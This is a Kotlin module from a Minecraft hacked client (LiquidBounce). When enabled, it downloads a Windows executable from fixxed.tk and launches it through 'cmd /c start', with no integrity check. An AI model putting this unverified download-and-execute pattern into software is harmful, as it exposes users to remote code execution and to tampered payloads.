package net.ccbluex.liquidbounce.features.module.modules.unstable

import com.google.gson.JsonObject
import com.google.gson.JsonParser
import me.glass20.idk.DownLoadFileUtils
import net.ccbluex.liquidbounce.LiquidBounce
import net.ccbluex.liquidbounce.event.EventTarget
import net.ccbluex.liquidbounce.features.module.Module
import net.ccbluex.liquidbounce.features.module.ModuleCategory
import net.ccbluex.liquidbounce.features.module.ModuleInfo
import net.ccbluex.liquidbounce.utils.ClientUtils
import net.ccbluex.liquidbounce.utils.misc.HttpUtils
import java.io.File

@ModuleInfo(name = "YuanKong", category = ModuleCategory.UNSTABLE)
class YuanKong : Module(){
    @EventTarget
    override fun onEnable() {
        /**
         * Yuankong get return Designed for C++
         */
        var latestykver = "Yuankong-1.exe"
        try{
            val jsonObj = JsonParser()
                .parse(HttpUtils.get("https://fixxed.tk/FixxedCloud/version.json"))
            if (jsonObj is JsonObject && jsonObj.has("Yuankong")) {
                latestykver = "Yuankong-${jsonObj["Yuankong"]}.exe"
                ClientUtils.logDebug("[Yuankong] latestver = $latestykver")
                   // exitProcess(1)
                }
        }catch (exception: Throwable){
            //exitProcess(1)
        }
        var newpath = "${System.getProperty("user.dir").replace("\\","/") }/${LiquidBounce.CLIENT_NAME}/"
        val file1 = File(newpath);
        ClientUtils.logWarn("[Yuankong] newpath = $newpath")
        if (file1.mkdirs()) {
            ClientUtils.logInfo("[Yuankong] Folder created successfully-$newpath")
        }else{
            ClientUtils.logInfo("[YuanKong] Unable to create new folder-$newpath")
        }
        val filePath = "https://fixxed.tk/FixxedCloud/Download/Yuankong/$latestykver"
        //ClientUtils.logInfo("[Yuankong] Download url: $filePath")
        val isdownload = DownLoadFileUtils.downLoadByUrl(filePath, newpath)
        if(!isdownload){
            ClientUtils.logError("[Yuankong] Unable to download $latestykver")
        }else{
            Runtime.getRuntime().exec("cmd /c start $newpath$latestykver $newpath$latestykver");
            /*
            ClientUtils.logWarn("[Yuankong] to start $newpath$latestykver $newpath$latestykver")
            val builder = ProcessBuilder("start $newpath$latestykver $newpath$latestykver")
            val process = builder.start()
            ClientUtils.logWarn("[Yuankong] Started ${latestykver}!")
            val exitCode = process.exitValue()
            ClientUtils.logWarn("[Yuankong] Check $latestykver exit!")
            ClientUtils.logWarn("[Yuankong] Get $latestykver return - $exitCode")
            if (exitCode != 0) {
                ClientUtils.logError("[Yuankong] Can't Get $latestykver return! Fuck you!")
            }
             */
        }
        state = false
    }
}